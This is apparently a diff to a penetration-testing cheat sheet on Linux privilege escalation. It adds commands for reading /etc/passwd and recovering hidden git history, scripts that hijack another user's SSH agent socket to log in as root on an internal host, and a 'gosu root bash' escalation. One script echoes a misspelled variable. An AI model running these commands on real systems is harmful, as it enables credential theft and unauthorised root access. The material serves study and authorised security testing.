@@ -756,6 +756,15 @@ rpm –qa | grep <program>oftenoften
 
 We can enumerate possible files that may contain credentials.
 
+### Users
+
+We can simply read the `/etc/passwd` file:
+
+```bash
+cat /etc/passwd
+cat /etc/passwd | grep 'sh$'
+```
+
 ### Configuration Files
 
 Enumerate files that contain config:
@@ -1542,10 +1551,60 @@ Sometimes, you will be able to see folders that contain a `.git` folder in them.
 git log
 ```
 
+Sometimes some logs may be hidden, for this we can use reflog:
+
+```text
+git reflog
+```
+
 We can use the parameter `-p` to look at the differences made in a commit:
 
 ```text
 git log -p <ID>
+```
+
+Alternatively, we can use diff:
+
+```text
+git diff <ID>
+```
+
+### SSH Agent Hijacking
+
+We need to set the environment variable SSH\_SOCK\_AUTH to the agent file, and then just ssh:
+
+```bash
+while true; do
+    export pid=$(ps -u kaneki_adm | grep ssh$ | tr -s ' ' | cut -d' ' -f2);
+    if [ ! -z $pid ]; then
+        echo "[+] Found pid for kaneki_adm ssh process: $pid";
+        export SSH_AUTH_SOCK=$(su kaneki_adm -c 'cat /proc/${pid}/environ' | sed 's/\x0/\n/g' | grep SSH_AUTH_SOCK | cut -d'=' -f2);
+        echo "[+] Found ssh auth socket: $SSH_AUTH_SOCKET";
+        echo "[*] sshing to target";
+        ssh root@172.18.0.1 -p 2222;
+        break;
+    fi;
+    sleep 5;
+done
+```
+
+Alternative script:
+
+```bash
+#!/bin/bash
+cd /tmp/ssh-*
+export SSH_AUTH_SOCK=$PWD/$(ls)
+#ssh-add -l
+#ssh-add -1
+ssh root@172.10.0.1 -p 2222
+```
+
+### Gosu
+
+An easy privilege escalation vector is:
+
+```text
+gosu root bash
 ```
 
 ### Decode VNC Password
